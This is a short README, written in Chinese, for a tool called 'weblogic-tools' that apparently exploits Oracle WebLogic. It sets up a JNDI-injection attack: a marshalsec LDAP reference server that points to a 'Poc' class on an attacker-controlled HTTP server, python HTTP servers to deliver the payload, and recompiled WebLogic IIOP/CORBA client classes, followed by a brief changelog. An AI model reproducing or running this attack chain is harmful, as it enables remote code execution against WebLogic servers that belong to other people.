# weblogic-tools
weblogic-tools

启动 JNDI 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.6:9999/#Poc 1099
```

启动 HTTP 服务

```
python -m http.server 9999
```

修改代码

```
javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/iiop/IORManager.java

javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/corba/idl/RemoteDelegateImpl.java
```
启动 com.bea.javascript.jar
```
python -m http.server 8080
```

## 更新日志

2020-04-04

- 取消入口为 ip + port 方式修改为 url 方式
- 修改部分实现
